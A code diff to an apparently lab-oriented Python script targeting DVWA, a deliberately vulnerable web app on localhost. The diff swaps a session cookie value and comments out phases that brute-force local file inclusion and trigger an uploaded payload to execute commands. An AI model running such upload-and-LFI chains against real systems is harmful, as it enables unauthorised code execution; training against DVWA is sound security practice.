@@ -9,11 +9,11 @@ import uploadv2
 
 
 URL = "http://localhost/DVWA/" #"http://192.168.52.129/DVWA/"
-UPLOAD_DIR = f"{URL}hackable/uploads/"
-UPLOAD_DIR_WORDLIST = "upload_dir_wordlists.txt"
+#UPLOAD_DIR = f"{URL}hackable/uploads/"
+UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
 COOKIE = {
-    'PHPSESSID': 'ks3ah94pfi21cdhe2ck77b6h6g',
+    'PHPSESSID': 'hello',
     'security': 'medium'
 }
 
@@ -75,26 +75,26 @@ def main():
     # if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
     #     print("[-] File upload failed. Exiting.")
     #     exit(1)
-    direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
-    print(f"[+] Direct file URL (if accessible): {direct_file_url}")
+    # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
+    # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
-    # --- LFI Brute Force and Trigger Phase ---
-    payload_relative = dynamic_upload_dir + PAYLOAD_FILENAME  # full URL for the file (from base)
-    lfi_found_url = None
-    for target in lfi_targets:
-        lfi_found_url = lfi.brute_force_lfi(target, payload_relative, session, COOKIE)
-        if lfi_found_url:
-            break
+    # # --- LFI Brute Force and Trigger Phase ---
+    # payload_relative = dynamic_upload_dir + PAYLOAD_FILENAME  # full URL for the file (from base)
+    # lfi_found_url = None
+    # for target in lfi_targets:
+    #     lfi_found_url = lfi.brute_force_lfi(target, payload_relative, session, COOKIE)
+    #     if lfi_found_url:
+    #         break
 
-    # --- Trigger Payload Phase ---
-    if lfi_found_url:
-        command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
-    else:
-        print("[-] Could not locate the uploaded file via LFI.")
-        command_results = ""
+    # # --- Trigger Payload Phase ---
+    # if lfi_found_url:
+    #     command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
+    # else:
+    #     print("[-] Could not locate the uploaded file via LFI.")
+    #     command_results = ""
 
-    # --- Report Generation ---
-    generate_report(direct_file_url, lfi_found_url, command_results)
+    # # --- Report Generation ---
+    # generate_report(direct_file_url, lfi_found_url, command_results)
     
 
 if __name__ == "__main__":
